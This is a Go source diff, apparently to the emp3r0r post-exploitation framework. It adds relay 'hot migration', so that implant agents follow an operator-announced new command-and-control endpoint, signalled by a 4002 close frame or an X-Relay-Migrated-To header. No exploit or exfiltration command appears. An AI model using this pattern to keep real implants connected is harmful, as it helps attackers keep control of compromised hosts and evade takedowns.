@@ -24,10 +24,12 @@ import (
 	"net/url"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/gorilla/websocket"
 	utls "github.com/refraction-networking/utls"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -192,6 +194,40 @@ func (r *relayConn) startPinger() {
 	}()
 }
 
+// relayMigration carries the newest relay endpoint the operator's hot
+// migration asked agents to move to. relayConn surfaces close(4002) frames
+// here; the agent's connect loop consumes it and re-dials the new endpoint.
+var relayMigration atomic.Value // string
+
+// SetRelayMigration records the new relay endpoint (wss://...) announced by
+// the relay's migration pointer.
+func SetRelayMigration(u string) {
+	if u != "" {
+		relayMigration.Store(u)
+	}
+}
+
+// RelayMigration returns the pending migration endpoint, or "".
+func RelayMigration() string {
+	v, _ := relayMigration.Load().(string)
+	return v
+}
+
+// relayMigrationClose reports whether a read error is the relay's migration
+// close frame (4002 + wss:// reason), recording the new endpoint.
+func relayMigrationClose(err error) (string, bool) {
+	ce, ok := err.(*websocket.CloseError)
+	if !ok || ce.Code != 4002 {
+		return "", false
+	}
+	target := strings.TrimSpace(ce.Text)
+	if !strings.HasPrefix(target, "ws://") && !strings.HasPrefix(target, "wss://") {
+		return "", false
+	}
+	SetRelayMigration(target)
+	return target, true
+}
+
 func (r *relayConn) Read(p []byte) (int, error) {
 	for {
 		if r.rbuf.Len() > 0 {
@@ -199,6 +235,9 @@ func (r *relayConn) Read(p []byte) (int, error) {
 		}
 		mt, data, err := r.conn.ReadMessage()
 		if err != nil {
+			if target, ok := relayMigrationClose(err); ok {
+				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
+			}
 			return 0, err
 		}
 		if mt == websocket.TextMessage {
@@ -307,6 +346,12 @@ func dialRelay(ctx context.Context, raw string) (*relayConn, *RelayRoomMsg, erro
 		conn, resp, err := relayDialer.DialContext(ctx, wsURL, nil)
 		if err != nil {
 			if resp != nil {
+				// 409 + X-Relay-Migrated-To: the old deployment was repointed
+				// at a newer one — record it so the agent re-dials the new endpoint.
+				if mig := resp.Header.Get("X-Relay-Migrated-To"); mig != "" {
+					SetRelayMigration(mig)
+					return nil, nil, fmt.Errorf("relay migrated by operator to %s", mig)
+				}
 				return nil, nil, fmt.Errorf("relay dial: %s (HTTP %d)", err, resp.StatusCode)
 			}
 			return nil, nil, fmt.Errorf("relay dial: %w", err)
@@ -316,6 +361,9 @@ func dialRelay(ctx context.Context, raw string) (*relayConn, *RelayRoomMsg, erro
 		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
 		_, raw_hello, err := conn.ReadMessage()
 		if err != nil {
+			if target, ok := relayMigrationClose(err); ok {
+				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
+			}
 			_ = conn.Close()
 			return nil, nil, fmt.Errorf("relay hello: %w", err)
 		}
